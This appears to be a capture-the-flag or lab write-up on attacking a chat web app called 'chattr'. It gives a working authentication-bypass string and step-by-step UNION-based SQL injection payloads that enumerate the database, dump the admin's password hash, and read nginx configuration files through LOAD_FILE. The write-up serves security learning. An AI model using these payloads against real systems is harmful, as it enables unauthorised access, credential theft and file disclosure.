### Question 1 :  What is the password hash for the user 'admin'?

Login page was not injectable so had to create an account.
On account creation, we find that the invitation code was injectable so captured the request since the front end has some validations, and injected with `' OR '1'='1` . Account got created

Once loggedin to dashboard, we can see users are listed on right and on clicking we can send messages or search.

Search was injectable so we started enumerating the current user, database version, database, tables, columns etc

Current user: 
```sql
cn') UNION SELECT 1,2, CURRENT_USER,4 -- --';
```

gave user: `chattr_dbUser@localhost`

database version: cn') UNION SELECT 1,2, @@version,4 -- --';

gave database version `10.11.11-MariaDB-0+deb12u1`

database name:

```
cn') UNION SELECT 1,2, database(),4 -- --';
```

gives database name `chattr`

Tables:

```sql
cn') UNION SELECT 1,2, TABLE_NAME,4 from information_schema.TABLES where table_schema ='chattr' -- --';
```

return table names: `Users`, `InvitationCodes` and `Messages`

User table schema:

```sql
cn') UNION SELECT 1,2,COLUMN_NAME, TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name ='Users' -- --';
```

gives `UserId`, `Username`, `Password`, `InvitationCode` and `AccountCreated`

getting password hash

```sql
') UNION SELECT 1,2,Password,Username from chattr.Users-- -';
```

gives password hash `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`

### Question 2:  What is the root path of the web application?

Using the query: 
```sql
tcn') UNION SELECT 1,2,variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

it returns null, meaning we can write to any file

Getting ngnix conf file

```
tcn') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4 -- - 
```

gives:
```
/etc/nginx/sites-enabled/*
```

loading the default in above directory with query:

```
tcn') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4 -- - 
```

gives default directory `/var/www/chattr-prod`
